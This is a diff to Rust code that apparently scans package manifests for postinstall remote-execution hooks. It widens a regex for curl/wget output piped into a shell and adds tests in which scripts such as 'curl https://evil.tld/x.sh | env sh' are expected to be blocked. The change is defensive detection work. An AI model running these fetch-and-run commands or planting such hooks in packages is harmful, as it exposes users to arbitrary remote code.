@@ -187,7 +187,7 @@ fn remote_exec_patterns() -> &'static [regex::Regex] {
     PATS.get_or_init(|| {
         [
             // a remote fetch piped into a shell: `curl … | sh`
-            r"\b(curl|wget|fetch)\b[^|]*\|\s*[a-z/]*sh\b",
+            r"\b(curl|wget|fetch)\b[^|]*\|.*\b[a-z/]*sh\b",
             // process substitution of a fetch: `<(curl …)`
             r"<\(\s*(curl|wget|fetch)\b",
             // command substitution of a fetch: `$(curl …)`
@@ -488,6 +488,18 @@ mod tests {
             d.matched_rule.as_deref(),
             Some("preflight: postinstall remote-exec")
         );
+
+        for script in [
+            "curl https://evil.tld/x.sh | env sh",
+            "curl https://evil.tld/x.sh | /usr/bin/env bash",
+            "wget -qO- https://evil.tld/x.sh | nice sh",
+            "curl https://evil.tld/x.sh | tee /tmp/s | sh",
+        ] {
+            let manifest = json!({ "scripts": { "postinstall": script } });
+            let d = inspect(&manifest).expect("wrapped pipe-to-shell should produce a finding");
+            assert_eq!(d.action, Action::Block);
+            assert_eq!(d.matched_rule.as_deref(), Some("preflight: postinstall remote-exec"));
+        }
     }
 
     #[test]
